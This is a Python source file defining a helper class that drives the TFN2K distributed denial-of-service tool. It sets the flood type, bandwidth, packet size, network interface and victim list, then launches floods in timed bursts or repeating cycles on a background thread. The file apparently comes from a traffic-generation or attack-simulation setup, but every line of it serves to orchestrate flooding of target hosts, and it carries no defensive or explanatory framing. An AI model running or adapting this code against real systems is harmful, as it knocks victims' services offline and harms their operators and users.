import command as cmd
import threading
import time


class utils(object):

    def __init__(self, **args):
        self.time_last = args['time_last']
        self.attack_interval = args['attack_interval']
        self.wait_interval = args['wait_interval']
        self.phy_interface = args['phy_interface']
        self.bandwidth = args['bandwidth']
        self.packet_size = args['packet_size']
        self.flood_type = args['flood_type']
        self.victims = args['victims']

        self.tfn2k = cmd.tfn2k(phy_interface=self.phy_interface, bandwidth=self.bandwidth, packet_size=self.packet_size, flood_type=self.flood_type, victims=self.victims)

    def start_(self):
        if self.wait_interval == '0':
            self.tfn2k.start_tfn2k()
            time.sleep(float(self.attack_interval))
            self.tfn2k.stop_tfn2k()
        else:
            while True:
                self.tfn2k.start_tfn2k()
                time.sleep(float(self.attack_interval))
                self.tfn2k.stop_tfn2k()
                time.sleep(float(self.wait_interval))

    # functions that can be called
    def start(self):
        thread = threading.Thread(target=self.start_)
        thread.setDaemon(True)
        thread.start()
        time.sleep(float(self.time_last))
        self.tfn2k.stop_td_and_tfn2k()
